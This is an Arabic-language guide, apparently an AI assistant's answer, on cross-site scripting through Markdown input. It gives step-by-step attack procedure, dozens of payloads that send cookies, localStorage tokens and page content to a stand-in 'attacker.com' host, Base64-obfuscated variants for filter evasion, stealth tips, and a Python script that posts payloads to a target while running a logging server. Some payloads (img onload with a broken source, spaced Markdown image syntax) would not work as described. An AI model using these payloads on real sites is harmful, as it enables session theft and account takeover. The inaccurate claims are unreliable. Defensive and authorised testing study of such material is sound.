
## الخطوات العملية للحقن المستخدمة في XSS عبر Markdown
1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة الطلبات الصادرة الناتجة عن الحقن.
   - أعد خادمًا خارجيًا (مثل خادم Python بسيط أو خدمة مثل `ngrok`) لتسجيل البيانات المرسلة من الحقن.
   - افتح أدوات المطورين في المتصفح (F12) لمراقبة وحدة التحكم (Console)، الشبكة (Network)، وتغييرات DOM.
   - تأكد من أن الموقع يدعم إدخال Markdown (مثل في التعليقات، المنشورات، أو حقول النصوص) ويحوله إلى HTML.

2. **تحديد نقاط الإدخال العرضة**:
   - ابحث عن نقاط إدخال تتيح إدخال محتوى Markdown، مثل:
     - حقول التعليقات في المنتديات أو المدونات.
     - منشورات المستخدم في منصات تدعم Markdown (مثل GitHub أو Reddit).
     - حقول وصف الملف الشخصي أو السيرة الذاتية.
     - معلمات URL التي تُعرض كمحتوى Markdown.
   - افحص استجابات الموقع (عبر Burp Suite أو عرض المصدر) لتحديد ما إذا كان يسمح بوسوم HTML أو روابط JavaScript في الناتج.
   - تحقق من مكتبة Markdown المستخدمة (مثل Marked، Showdown) وسياسات التنظيف (sanitize) عبر اختبار وسوم بسيطة مثل `<b>test</b>`.

3. **إدخال الحقن**:
   - أدخل محتوى Markdown يحتوي على وسوم HTML، روابط JavaScript، أو هياكل ضارة في نقطة الإدخال العرضة.
   - صمم الحقنة لتنفيذ شيفرة ضارة، مثل:
     - `<script>alert('XSS')</script>`
     - `[Click](javascript:fetch('http://attacker.com/log?c='+document.cookie))`
     - `<img src=x onload="fetch('http://attacker.com/log?c='+document.cookie)">`
   - جرب الحقن في سياقات مختلفة:
     - حقل تعليق: أدخل `<script>fetch('http://attacker.com/log?c='+document.cookie)</script>` في تعليق.
     - منشور: أدخل `[Click](javascript:alert('XSS'))` في منشور Markdown.
     - معلمة URL: `https://example.com/?comment=<img src=x onload="alert('XSS')">`
     - وصف الملف الشخصي: أدخل `<img src=x onerror="fetch('http://attacker.com/log?d='+document.domain)">`.

4. **مراقبة الاستجابات**:
   - تحقق من تنفيذ الحقنة عبر:
     - **أدوات المطورين**: راقب وحدة التحكم (Console) للأخطاء أو التنبيهات، والشبكة (Network) للطلبات الصادرة.
     - **خادم خارجي**: تحقق من سجلات الخادم لتأكيد استلام البيانات (مثل ملفات تعريف الارتباط).
     - **تغييرات DOM**: تحقق من تعديل الصفحة أو إعادة التوجيه.
   - **نجاح (True)**: الشيفرة تُنفذ (مثل ظهور تنبيه، إرسال بيانات إلى الخادم، أو إعادة توجيه).
   - **فشل (False)**: لا يتم التنفيذ بسبب فلاتر، CSP، أو تنظيف الإدخال.
   - سجل النتائج لتحديد الحقن الناجحة.

5. **تجربة أنواع حقن مختلفة**:
   - إذا فشلت الحقنة، جرب أنواعًا أخرى:
     - استخدام وسوم HTML مختلفة: `<script>`، `<img>`، `<iframe>`، `<a>`، أو `<div>`.
     - استهداف أحداث مختلفة: `onload`، `onerror`، `onclick`، أو `onmouseover`.
     - تجاوز الفلاتر: جرب صيغ بديلة مثل `<SCRIPT>` (حروف كبيرة) أو تعتيم الشيفرة بـ Base64.
   - اختبر نقاط إدخال متعددة (مثل حقول تعليقات أخرى، منشورات، أو معلمات URL).
   - جرب حقنًا تستغل ميزات Markdown مثل صور `![alt](...)` أو روابط `[text](...)`.

6. **تأكيد السياق وتصعيد الاستغلال (اختياري)**:
   - استخدم حقن تكشف سياق التنفيذ (مثل `<img src=x onload="fetch('http://attacker.com/log?d='+document.domain)">`).
   - إذا نجحت الحقن، جرب هجمات متقدمة مثل:
     - سرقة بيانات حساسة (مثل `localStorage.getItem('token')`).
     - التلاعب بالصفحة (مثل إنشاء نموذج مزيف).
     - تنفيذ إجراءات المستخدم (مثل إرسال طلبات POST).
   - حافظ على التخفي بتجنب التنبيهات البصرية إذا كنت تستهدف سياقات حساسة.

---

## جميع المحاولات الممكنة للحقن المستخدمة في XSS عبر Markdown
في الحقن المستخدمة في XSS عبر Markdown، المحاولات تركز على إدراج وسوم HTML أو روابط JavaScript ضمن محتوى Markdown لتنفيذ شيفرات ضارة. سأقسم المحاولات إلى فئتين:
1. **الحقن اليدوية**: للاختبار اليدوي عبر نقاط الإدخال العرضة.
2. **الحقن للأتمتة**: للاستخدام مع سكربتات أو أدوات آلية.

### 1. الحقن اليدوية
تُستخدم هذه الحقن عند اختبار الثغرة يدويًا عبر إدخال محتوى Markdown في حقول النماذج، معلمات URL، أو منشورات. الهدف هو تنفيذ JavaScript عبر تحويل Markdown إلى HTML.

#### أ. حقن باستخدام وسوم HTML
إدراج وسوم HTML مباشرة ضمن Markdown لتنفيذ JavaScript.
- **الحقن**: `<script>alert('XSS')</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>alert('XSS')</script>`
  - **كيف يعمل**: ينفذ تنبيهًا عند عرض الناتج كـ HTML.
  - **متى يُستخدم؟**: لتأكيد وجود ثغرة XSS.
- **الحقن**: `<script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>`
  - **الإدخال**: أدخل في منشور Markdown: `<script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إلى خادم المهاجم.
  - **متى يُستخدم؟**: لسرقة بيانات الجلسة.
- **الحقن**: `<script>document.location='http://attacker.com'</script>`
  - **الإدخال**: `https://example.com/?comment=<script>document.location='http://attacker.com'</script>`
  - **كيف يعمل**: يعيد توجيه المستخدم إلى موقع ضار.
  - **متى يُستخدم؟**: لإعادة التوجيه الخبيث.
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>`
  - **الإدخال**: أدخل في وصف الملف الشخصي: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>`
  - **كيف يعمل**: يرسل محتوى الصفحة إلى الخادم.
  - **متى يُستخدم؟**: لاستخراج محتوى DOM.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>`
  - **كيف يعمل**: يرسل رمز الجلسة من `localStorage`.
  - **متى يُستخدم؟**: لسرقة بيانات التخزين.

#### ب. حقن باستخدام روابط JavaScript
استخدام صيغة الروابط في Markdown لتنفيذ JavaScript.
- **الحقن**: `[Click](javascript:alert('XSS'))`
  - **الإدخال**: أدخل في منشور: `[Click](javascript:alert('XSS'))`
  - **كيف يعمل**: ينفذ تنبيهًا عند النقر على الرابط.
  - **متى يُستخدم؟**: لتأكيد الثغرة عند التفاعل.
- **الحقن**: `[Click](javascript:fetch('http://attacker.com/log?c='+document.cookie))`
  - **الإدخال**: أدخل في حقل تعليق: `[Click](javascript:fetch('http://attacker.com/log?c='+document.cookie))`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند النقر.
  - **متى يُستخدم؟**: لسرقة البيانات عند التفاعل.
- **الحقن**: `[Click](javascript:document.location='http://attacker.com')`
  - **الإدخال**: `https://example.com/?comment=[Click](javascript:document.location='http://attacker.com')`
  - **كيف يعمل**: يعيد توجيه المستخدم عند النقر.
  - **متى يُستخدم؟**: لإعادة التوجيه.
- **الحقن**: `[Click](javascript:new Image().src='http://attacker.com/log?d='+document.domain)`
  - **الإدخال**: أدخل في وصف: `[Click](javascript:new Image().src='http://attacker.com/log?d='+document.domain)`
  - **كيف يعمل**: يرسل النطاق عند النقر.
  - **متى يُستخدم؟**: لتأكيد سياق التنفيذ.
- **الحقن**: `[Click](javascript:fetch('http://attacker.com/log', {method: 'POST', body: localStorage.getItem('token')}))`
  - **الإدخال**: أدخل في منشور: `[Click](javascript:fetch('http://attacker.com/log', {method: 'POST', body: localStorage.getItem('token')}))`
  - **كيف يعمل**: يرسل رمز الجلسة عند النقر.
  - **متى يُستخدم؟**: لسرقة بيانات التخزين.

#### ج. حقن باستخدام وسوم صور أو أحداث
استخدام وسوم HTML مثل `<img>` مع أحداث لتنفيذ JavaScript.
- **الحقن**: `<img src=x onload="alert('XSS')">`
  - **الإدخال**: أدخل في حقل تعليق: `<img src=x onload="alert('XSS')">`
  - **كيف يعمل**: ينفذ تنبيهًا عند تحميل الصورة.
  - **متى يُستخدم؟**: لتأكيد الثغرة تلقائيًا.
- **الحقن**: `<img src=x onload="fetch('http://attacker.com/log?c='+document.cookie)">`
  - **الإدخال**: أدخل في منشور: `<img src=x onload="fetch('http://attacker.com/log?c='+document.cookie)">`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند تحميل الصورة.
  - **متى يُستخدم؟**: لسرقة البيانات تلقائيًا.
- **الحقن**: `<img src=x onerror="fetch('http://attacker.com/log?d='+document.domain)">`
  - **الإدخال**: `https://example.com/?comment=<img src=x onerror="fetch('http://attacker.com/log?d='+document.domain)">`
  - **كيف يعمل**: يرسل النطاق عند فشل تحميل الصورة.
  - **متى يُستخدم؟**: لتجاوز فلاتر `<script>`.
- **الحقن**: `<img src=x onload="fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})">`
  - **الإدخال**: أدخل في وصف: `<img src=x onload="fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})">`
  - **كيف يعمل**: يرسل محتوى الصفحة عند تحميل الصورة.
  - **متى يُستخدم؟**: لاستخراج محتوى DOM.
- **الحقن**: `<img src=x onmouseover="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')">`
  - **الإدخال**: أدخل في حقل تعليق: `<img src=x onmouseover="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')">`
  - **كيف يعمل**: يرسل رمز الجلسة عند تمرير المؤشر.
  - **متى يُستخدم؟**: لتتبع التفاعل.

#### د. حقن باستخدام صيغ Markdown للصور
استخدام صيغة الصور في Markdown لإدراج وسوم ضارة.
- **الحقن**: `![alt](x onload=alert('XSS'))`
  - **الإدخال**: أدخل في منشور: `![alt](x onload=alert('XSS'))`
  - **كيف يعمل**: يُحول إلى `<img src="x" onload="alert('XSS')">` وينفذ تنبيهًا.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر `<img>` مباشرة.
- **الحقن**: `![alt](x onload=fetch('http://attacker.com/log?c='+document.cookie))`
  - **الإدخال**: أدخل في حقل تعليق: `![alt](x onload=fetch('http://attacker.com/log?c='+document.cookie))`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند تحميل الصورة.
  - **متى يُستخدم؟**: لسرقة البيانات.
- **الحقن**: `![alt](x onerror=fetch('http://attacker.com/log?d='+document.domain))`
  - **الإدخال**: `https://example.com/?comment=![alt](x onerror=fetch('http://attacker.com/log?d='+document.domain))`
  - **كيف يعمل**: يرسل النطاق عند فشل تحميل الصورة.
  - **متى يُستخدم؟**: لتأكيد سياق التنفيذ.
- **الحقن**: `![alt](x onload=document.location='http://attacker.com')`
  - **الإدخال**: أدخل في وصف: `![alt](x onload=document.location='http://attacker.com')`
  - **كيف يعمل**: يعيد توجيه المستخدم عند تحميل الصورة.
  - **متى يُستخدم؟**: لإعادة التوجيه.
- **الحقن**: `![alt](x onload=new Image().src='http://attacker.com/log?s='+localStorage.getItem('token'))`
  - **الإدخال**: أدخل في منشور: `![alt](x onload=new Image().src='http://attacker.com/log?s='+localStorage.getItem('token'))`
  - **كيف يعمل**: يرسل رمز الجلسة عند تحميل الصورة.
  - **متى يُستخدم؟**: لسرقة بيانات التخزين.

#### هـ. حقن مع التعتيم
استخدام تقنيات التعتيم لتجنب الكشف.
- **الحقن**: `<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>`
  - **كيف يعمل**: يفك تشفير Base64 لتنفيذ تنبيه.
  - **متى يُستخدم؟**: لتجاوز فلاتر WAF.
- **الحقن**: `[Click](javascript:eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp')))`
  - **الإدخال**: أدخل في منشور: `[Click](javascript:eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp')))`
  - **كيف يعمل**: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط عند النقر.
  - **متى يُستخدم؟**: لتجنب أنظمة الكشف.
- **الحقن**: `<img src=x onload="alert(String.fromCharCode(88,83,83))">`
  - **الإدخال**: أدخل في وصف: `<img src=x onload="alert(String.fromCharCode(88,83,83))">`
  - **كيف يعمل**: ينشئ تنبيهًا باستخدام رموز ASCII.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر النصوص المباشرة.
- **الحقن**: `<script>setTimeout(() => fetch('http://attacker.com/log?c='+document.cookie), 1000)</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>setTimeout(() => fetch('http://attacker.com/log?c='+document.cookie), 1000)</script>`
  - **كيف يعمل**: يؤخر إرسال البيانات لتجنب الكشف.
  - **متى يُستخدم؟**: لتجنب أنظمة المراقبة الفورية.
- **الحقن**: `![alt](x onload=eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp')))`
  - **الإدخال**: أدخل في منشور: `![alt](x onload=eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp')))`
  - **كيف يعمل**: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط عند تحميل الصورة.
  - **متى يُستخدم؟**: لتجاوز فلاتر صارمة.


#### زـ. نوع جديد من الحقن 

#### الشرح :


![[2025-06-05 00-39-36.mkv]]

##### البايلود اللي في الفديوا  

```bash
[[alt|" onerror=alert(1)]]
```


### 2. الحقن للأتمتة
تُستخدم هذه الحقن مع سكربتات (مثل Python مع مكتبة `requests` أو `selenium`) لأتمتة اختبار مجموعة من الحقن المستخدمة في XSS عبر Markdown وتحليل الاستجابات.

#### أ. إعداد قائمة الحقن
- **المحاولات**:
  - إنشاء قائمة بالحقن التي تستخدم وسوم HTML، روابط JavaScript، وصيغ Markdown.
  - مثال قائمة:
    ```
    <script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>
    [Click](javascript:alert('XSS'))
    <img src=x onload="fetch('http://attacker.com/log?c='+document.cookie)">
    ![alt](x onload=fetch('http://attacker.com/log?c='+document.cookie))
    <script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
    ```
- **كيف يعمل**:
  - يتم إرسال الحقن عبر نقاط إدخال (مثل حقول تعليقات، منشورات، أو معلمات URL).
  - يتم مراقبة الخادم الخارجي أو المتصفح لتأكيد التنفيذ.
- **متى يُستخدم؟**:
  - عند اختبار نقاط إدخال متعددة بسرعة.

#### ب. سكربت أتمتة بسيط
- **السكربت** (مثال بلغة Python مع خادم لتسجيل البيانات):
  ```python
  from http.server import BaseHTTPRequestHandler, HTTPServer
  import urllib.parse
  import requests

  class LogServer(BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.end_headers()
          query = urllib.parse.urlparse(self.path).query
          print(f"بيانات مستلمة: {urllib.parse.parse_qs(query)}")

      def do_POST(self):
          self.send_response(200)
          self.end_headers()
          content_length = int(self.headers['Content-Length'])
          post_data = self.rfile.read(content_length).decode()
          print(f"بيانات POST مستلمة: {post_data}")

  payloads = [
      "<script>fetch('http://localhost:8000/log?c='+encodeURIComponent(document.cookie))</script>",
      "[Click](javascript:alert('XSS'))",
      "<img src=x onload=\"fetch('http://localhost:8000/log?c='+document.cookie)\">",
      "![alt](x onload=fetch('http://localhost:8000/log?c='+document.cookie))",
      "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>"
  ]

  target_url = "https://example.com/submit-comment"
  for payload in payloads:
      try:
          requests.post(target_url, data={"comment": payload})
          print(f"تم إرسال: {payload}")
      except:
          print(f"فشل إرسال: {payload}")
  server = HTTPServer(('localhost', 8000), LogServer)
  print("تشغيل الخادم على http://localhost:8000")
  server.serve_forever()
  ```
- **كيف يعمل**:
  - يُشغل خادمًا محليًا لتسجيل البيانات.
  - يُرسل الحقن إلى نقطة إدخال (مثل حقل تعليق) عبر طلب POST.
  - يسجل البيانات المستلمة في الخادم.
- **متى يُستخدم؟**:
  - عند الحاجة لاختبار آلي لنقاط إدخال متعددة.

#### ج. تحليل الاستجابات
- **المحاولات**:
  - قارن الاستجابات بناءً على:
    - **طلبات الشبكة**: تحقق من الطلبات المرسلة إلى `http://attacker.com/log`.
    - **وحدة التحكم**: تحقق من ظهور تنبيهات أو أخطاء في Console.
    - **تغييرات DOM**: تحقق من إعادة التوجيه أو تعديل الصفحة.
  - مثال: إذا تلقى الخادم `c=sessionid=abc123`، فهذا يؤكد نجاح الحقن.
- **كيف يعمل**:
  - يتم تسجيل الاستجابات لتحديد الحقن الناجحة.
- **متى يُستخدم؟**:
  - لتحديد الحقن الأكثر فعالية.

#### د. توسيع قائمة الحقن
- **المحاولات**:
  - أضف حقنًا إضافية (مثل `<iframe src="javascript:alert('XSS')">` أو `[Click](data:text/html,<script>alert('XSS')</script>)`).
  - جرب أحداث أخرى (مثل `onfocus`، `onblur`) أو وسوم أخرى (مثل `<div>`، `<input>`).
  - اختبر صيغ Markdown أخرى (مثل كود مضمن `` `code` `` أو جداول).
- **كيف يعمل**:
  - يتم إنشاء قائمة موسعة تشمل كل المتغيرات الممكنة.
  - مثال: إضافة `<div onclick="fetch('http://attacker.com/log?c='+document.cookie)">Click</div>` إلى القائمة.
- **متى يُستخدم؟**:
  - عند الحاجة لتغطية شاملة للسياقات.

---



1. حقن باستخدام وسوم HTML:
- <script>alert('XSS')</script>: ينفذ تنبيهًا عند العرض.
- <script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>: يرسل ملفات تعريف الارتباط.
- <script>document.location='http://attacker.com'</script>: يعيد توجيه المستخدم.
- <script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>: يرسل محتوى الصفحة.
- <script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>: يرسل رمز الجلسة.

2. حقن باستخدام روابط JavaScript:
- [Click](javascript:alert('XSS')): ينفذ تنبيهًا عند النقر.
- [Click](javascript:fetch('http://attacker.com/log?c='+document.cookie)): يرسل ملفات تعريف الارتباط عند النقر.
- [Click](javascript:document.location='http://attacker.com'): يعيد توجيه المستخدم عند النقر.
- [Click](javascript:new Image().src='http://attacker.com/log?d='+document.domain): يرسل النطاق عند النقر.
- [Click](javascript:fetch('http://attacker.com/log', {method: 'POST', body: localStorage.getItem('token')})): يرسل رمز الجلسة عند النقر.

3. حقن باستخدام وسوم صور أو أحداث:
- <img src=x onload="alert('XSS')">: ينفذ تنبيهًا عند تحميل الصورة.
- <img src=x onload="fetch('http://attacker.com/log?c='+document.cookie)">: يرسل ملفات تعريف الارتباط عند تحميل الصورة.
- <img src=x onerror="fetch('http://attacker.com/log?d='+document.domain)">: يرسل النطاق عند فشل تحميل الصورة.
- <img src=x onload="fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})">: يرسل محتوى الصفحة.
- <img src=x onmouseover="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')">: يرسل رمز الجلسة عند تمرير المؤشر.

4. حقن باستخدام صيغ Markdown للصور:
- ![alt](x onload=alert('XSS')): ينفذ تنبيهًا عند تحميل الصورة.
- ![alt](x onload=fetch('http://attacker.com/log?c='+document.cookie)): يرسل ملفات تعريف الارتباط.
- ![alt](x onerror=fetch('http://attacker.com/log?d='+document.domain)): يرسل النطاق.
- ![alt](x onload=document.location='http://attacker.com'): يعيد توجيه المستخدم.
- ![alt](x onload=new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')): يرسل رمز الجلسة.

5. حقن مع التعتيم:
- <script>eval(atob('YWxlcnQoJ1hTUycp'))</script>: يفك تشفير Base64 لتنفيذ تنبيه.
- [Click](javascript:eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))): يفك تشفير Base64 ويرسل ملفات تعريف الارتباط.
- <img src=x onload="alert(String.fromCharCode(88,83,83))">: يستخدم رموز ASCII.
- <script>setTimeout(() => fetch('http://attacker.com/log?c='+document.cookie), 1000)</script>: يؤخر إرسال البيانات.
- ![alt](x onload=eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))): يفك تشفير Base64 في صورة.



---

**نصائح إضافية**:
- **اختبار مكتبة Markdown**: حاول تحديد مكتبة Markdown المستخدمة (مثل Marked، Showdown) عبر اختبار ميزات محددة (مثل دعم HTML أو الروابط).
- **إعداد الخادم**: استخدم خادمًا بسيطًا (مثل Python `http.server`) أو `ngrok` لتسجيل البيانات، وتأكد من دعم طلبات GET وPOST.
- **تجاوز الفلاتر**: جرب تغيير حالة الأحرف (مثل `<SCRIPT>`)، استخدام أحداث غير شائعة (مثل `onfocus`)، أو تعتيم الشيفرة بـ Base64 أو ASCII.
- **اختبار نقاط الإدخال**: ركز على التعليقات، المنشورات، أوصاف الملفات الشخصية، ومعلمات URL التي تُعرض كـ Markdown.
- **الأدوات**: استخدم **Burp Suite** لمراقبة الطلبات، **XSStrike** لتوليد الحقن، أو **Selenium** لمحاكاة التفاعل مع الحقن.
- **القيود**: تحقق من سياسات CSP (Content Security Policy) التي قد تحظر تنفيذ JavaScript أو الطلبات الخارجية.
- **السلامة**: اختبر فقط بإذن صريح (مثل برامج مكافآت الأخطاء) وتجنب إلحاق الضرر.

إذا كنت تريد شرح خطوة أخرى بنفس الأسلوب (مثل "Stored XSS Payloads" أو "Bypassing XSS Filters")، أو التركيز على سياق معين (مثل Markdown XSS في منصات معينة مثل GitHub)، أخبرني وسأقدم ردًا مخصصًا!